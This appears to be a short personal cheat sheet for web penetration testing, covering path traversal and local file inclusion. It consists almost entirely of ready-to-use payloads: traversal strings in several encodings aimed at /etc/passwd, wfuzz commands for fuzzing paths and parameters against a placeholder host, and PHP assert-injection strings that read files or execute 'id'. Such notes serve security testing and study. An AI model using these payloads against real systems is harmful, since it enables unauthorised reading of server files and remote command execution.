1. Simple path traversal `filename=../../../etc/passwd`
2. Using absolute path `filename=/etc/passwd`
3. Nested traversal sequences, such as `....//` or `....\/`
4. Encoding
	1. `../` characters results in `%2e%2e%2f` and `%252e%252e%252f`
	2. Non-standard encodings, such as `..%c0%af` or `..%ef%bc%8f`, may also work.
5. Including required base folder followed by suitable traversal sequences. For example: `filename=/var/www/images/../../../etc/passwd`
6. Using null-byte to end with expected extension `filename=../../../etc/passwd%00.png`

# Practical attacks

Turbo intruder
Practical wordlist -> `C:\Users\Eugenio\Tools\PayloadsAllTheThings\Directory Traversal\Intruder\deep_traversal.txt`


# Path traversal

```bash
wfuzz -w "/opt/PayloadsAllTheThings/File Inclusion/Intruders/Traversal.txt" --hh=<312> http://contoso.com/FUZZ
```

# Parameter fuzzing

We can fuzz for hidden parameter

```bash
wfuzz -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt -o fuzz-params.txt http://contoso.com/index.php?FUZZ=/etc/passwd
```

# LFI via PHP's 'assert'

```php
assert("strpos('$file', '..') === false") or die("");
```

```bash
' and die(highlight_file('/etc/passwd')) or '
```

```bash
' and die(system("id")) or '
```